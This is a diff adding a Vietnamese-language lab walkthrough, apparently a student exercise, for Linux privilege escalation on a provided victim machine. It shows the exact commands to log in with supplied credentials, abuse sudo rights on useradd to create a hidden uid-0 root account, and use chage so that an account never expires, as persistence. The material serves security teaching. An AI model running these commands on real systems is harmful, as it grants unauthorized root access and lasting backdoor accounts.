@@ -1,0 +1,22 @@
+•	Bước 1: Sinh viên sử dụng thông tin máy victim đã được cung cấp trong file credential.txt có sẵn để truy cập máy victim.
+				Attacker: 
+ssh <username>@<ip_victim>
+•	Bước 2: Sau khi ssh thành công vào máy victim, sinh viên thực hiện kiểm tra các quyền sudo mà user này có. 
+sudo -l
+•	Bước 3: Sinh viên phát hiện có lệnh sudo là useradd, passwd mà user có thể dùng. Lợi dụng nó để tạo tài khoản mới với đặc quyền cao, sinh viên dùng lệnh tạo tài khoản với quyền root: 
+sudo useradd -u 0 -g 0 -o -m <username>
+-u 0 : chỉ định uid với uid 0 là user với quyền root
+-g 0: chỉ định groupid với groupid 0 là nhóm tài khoản root
+-o : cho phép tạo tài khoản trùng uid
+-m : tạo thư mục của user này
+•	Bước 4: Đặt mật khẩu cho tài khoản vừa tạo:
+sudo passwd <username>
+•	Bước 5: Chuyển đổi sang tài khoản vừa tạo:
+su - <username>
+•	Bước 6: Thay đổi thời gian đổi mật khẩu của user mà người dùng đã có được là user1 
+sudo chage -I -1 -m 0 -M 123456789 -E -1 user1
+-I -1: Xác định số ngày sau khi mật khẩu hết hạn mà vô hiệu hóa tài khoản, với -1 là không bao giờ vô hiệu hóa
+-m 0: Chỉ định số ngày tối thiểu giữa các lần thay đổi mật khẩu. Với 0 là có thể thay đổi mật khẩu bất cứ lúc nào
+-M 123456789: Chỉ định số ngày tối đa giữa các lần thay đổi mật khẩu, thay đổi thành 1 khoảng thời gian rất lớn 123456789
+-E -1: Xác định ngày hết hạn của tài khoản, với -1 là không bao giờ hết hạn.
+
